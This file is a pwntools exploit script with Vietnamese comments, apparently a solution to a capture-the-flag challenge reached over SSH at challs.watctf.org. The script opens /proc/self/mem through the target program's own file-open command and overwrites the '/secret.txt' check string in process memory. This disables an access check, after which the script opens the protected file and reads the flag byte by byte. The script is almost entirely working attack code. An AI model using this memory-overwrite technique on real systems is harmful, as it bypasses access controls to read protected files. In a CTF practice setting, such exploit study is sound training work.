from pwn import *

# --- Cấu hình ---
try:
    # Đảm bảo bạn đang dùng file main gốc của v2
    elf = context.binary = ELF('./main', checksec=True)
except FileNotFoundError:
    log.error("Không tìm thấy file thực thi 'main' GỐC của v2.")
    exit()

# --- Kết nối ---
r = None
try:
    log.info("Chạy ssh như một tiến trình cục bộ...")
    r = process(['ssh', '-p', '2022', 'hexed@challs.watctf.org'])
    r.recvuntil(b'> ', timeout=10)
    log.success("Kết nối thành công và đã nhận được prompt!")
except Exception as e:
    log.error(f"Kết nối hoặc nhận prompt thất bại: {e}"); 
    if r: r.close()
    exit()

# --- Các hàm tương tác ---
def do_open(path): r.sendline(f'open {path}'.encode()); r.recvuntil(b'> ')
def do_set(addr, value): r.sendline(f'set {addr} {value:x}'.encode()); r.recvuntil(b'> ')
def do_get(pos):
    r.sendline(f'get {pos}'.encode())
    output = r.recvuntil(b'> ', drop=True).decode()
    try: return output.strip().split('\n')[-1].strip()
    except: return ""

# --- Giai đoạn 1: Tìm địa chỉ của chuỗi "/secret.txt" ---
try:
    secret_string_addr = next(elf.search(b'/secret.txt\x00'))
    log.success(f"Tìm thấy chuỗi '/secret.txt' tại địa chỉ: {hex(secret_string_addr)}")
except StopIteration:
    log.error("Không tìm thấy chuỗi '/secret.txt' trong file binary. Có thể file đã bị thay đổi.")
    r.close(); exit()

# --- Giai đoạn 2: Mở bộ nhớ và ghi đè chuỗi kiểm tra ---
log.info("Mở /proc/self/mem để có quyền ghi vào bộ nhớ")
do_open('/proc/self/mem')

log.info(f"Bắt đầu ghi đè chuỗi kiểm tra tại {hex(secret_string_addr)}")
# Ghi đè bằng một chuỗi rác, ví dụ "X"
for i in range(len("/secret.txt")):
    do_set(secret_string_addr + i, ord('X'))
log.success("Vô hiệu hóa kiểm tra an ninh thành công!")

# --- Giai đoạn 3: Mở file flag và đọc nội dung ---
log.info("Mở file /secret.txt (bây giờ sẽ thành công)")
do_open("/secret.txt")

log.info("Bắt đầu đọc flag...")
flag_chars = []
for i in range(100): # Đọc tối đa 100 byte
    hex_char_str = do_get(i)
    if not hex_char_str or 'small' in hex_char_str or 'not editing' in hex_char_str:
        break
    try:
        char = chr(int(hex_char_str, 16))
        flag_chars.append(char)
    except ValueError:
        log.warning(f"Nhận được output không hợp lệ: '{hex_char_str}'")
        break

if flag_chars:
    log.success(f"FLAG: {''.join(flag_chars)}")
else:
    log.error("Không đọc được flag. Lỗi không mong muốn đã xảy ra.")

r.close()